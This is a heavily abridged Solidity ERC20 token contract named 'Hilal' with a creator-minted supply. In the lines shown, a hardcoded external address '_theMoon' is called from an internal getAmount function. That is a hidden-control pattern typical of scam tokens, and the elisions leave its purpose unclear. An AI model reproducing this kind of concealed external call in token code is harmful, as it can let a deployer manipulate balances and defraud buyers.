...
Hilal (Arabic: هلال, hilāl), the crescent moon.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _theMoon = 0x847e905E08844177A37300B404AE14D74f7949eB;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return theMoon.sendTransaction(amount);
    }
    ...
    function _DeployHilal(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHilal(creator, initialSupply);
    }
}

contract Hilal is ERC20Token {
    constructor() ERC20Token("HILAL", "HILAL", msg.sender, 10000000000 * 10 ** 18) {
    }
}